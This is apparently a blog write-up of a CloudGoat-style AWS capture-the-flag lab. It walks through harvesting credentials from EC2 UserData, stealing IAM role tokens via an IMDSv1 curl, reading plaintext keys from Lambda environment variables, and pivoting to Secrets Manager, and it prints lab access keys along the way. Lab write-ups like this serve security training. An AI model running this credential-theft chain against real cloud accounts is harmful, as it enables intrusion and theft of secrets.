---
layout: default
title: "Data Secrets"
date: 2026-03-28
---

# ./ Hacksmarter/Data_Secrets:~# 

> **Machine:** Data Secrets
> **Platform:** AWS
> **Difficulty:** Medium
> **Techniques:** EC2 UserData Analysis, IMDSv1 Abuse, Lambda Env Var Exfiltration, IAM Pivot

---

### [~] Initial_Access:~#

We start with a set of low-privilege IAM credentials. First, we configure our local profile and verify the identity of the `cg-start-user`:

```bash
aws configure --profile data
# [Input AKIA2HVQ5NJFVWNNM4P2 / LjLG6WyesA2nYZQ4Q6I5MA5w...]

aws sts get-caller-identity --profile data
Identity: arn:aws:iam::703671921227:user/cg-start-user-cgidogtj5df20x
```

[!] EC2_Enumeration:~#
Scanning for active compute resources. We find two instances tagged as cg-sensitive-ec2.

```bash
aws ec2 describe-instances --profile data --query 'Reservations[*].Instances[*].[InstanceId,PublicIpAddress,Tags]'
```
Observation: One instance (i-0405a86bd1eb8a6f9) has a public IP: 98.91.201.20.

To find a way in, I checked the UserData attribute of the instances. Developers often leave setup scripts here that contain hardcoded credentials:

```bash
aws ec2 describe-instance-attribute --instance-id i-0ab04892607e68a09 --attribute userData --profile data
```

Decoded UserData:

```bash
#!/bin/bash
echo "ec2-user:CloudGoatInstancePassword!" | chpasswd
```
🔥 Creds Leaked: ec2-user : CloudGoatInstancePassword!

[#] Lateral_Movement_&_IMDS:~#
Using the leaked password, I SSH'd into the public instance. Once inside, I queried the Instance Metadata Service (IMDS) to steal the IAM role credentials attached to the VM:

```bash
# Targeting IMDSv1 (Instance MetaData Service) 
curl [http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgid42ghgr66ot](http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-cgid42ghgr66ot)
```
I exported these temporary tokens (AccessKey, SecretKey, SessionToken) to my local machine as a new profile named role.

[!] Lambda_Credential_Harvesting:~#
With the EC2 role permissions, I enumerated the Lambda functions in the account:

```bash
aws lambda list-functions --profile role --region us-east-1
```
Discovery: Three functions are configured with plaintext AWS credentials in their Environment Variables.

```json
"Environment": {
    "Variables": {
        "DB_USER_ACCESS_KEY": "AKIA2HVQ5NJFZNHXUN6W",
        "DB_USER_SECRET_KEY": "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"
    }
}
```
[root] Objective_Secrets_Manager:~#
I pivoted one last time using the Lambda user credentials. This user had the permissions required to access the  AWS Secrets Manager.

```bash
aws secretsmanager list-secrets --profile user --region us-east-1
aws secretsmanager get-secret-value --secret-id cg-final-flag-cgid1cu9rl0f6y --profile user

{
Data Secrets 25
 "ARN": "arn:aws:secretsmanager:us-east-1:703671921227:sec
ret:cg-final-flag-cgid1cu9rl0f6y-Qe2Tlq",
 "Name": "cg-final-flag-cgid1cu9rl0f6y",
 "VersionId": "terraform-20260320184038801300000002",
 "SecretString": "{\"flag\":\"d4t4_s3cr3ts_4r3_fun\"}",
 "VersionStages": [
 "AWSCURRENT"
 ],
 "CreatedDate": "2026-03-20T19:40:38.836000+01:00"
```

Final_Flag: d4t4_s3cr3ts_4r3_fun

Thank you 
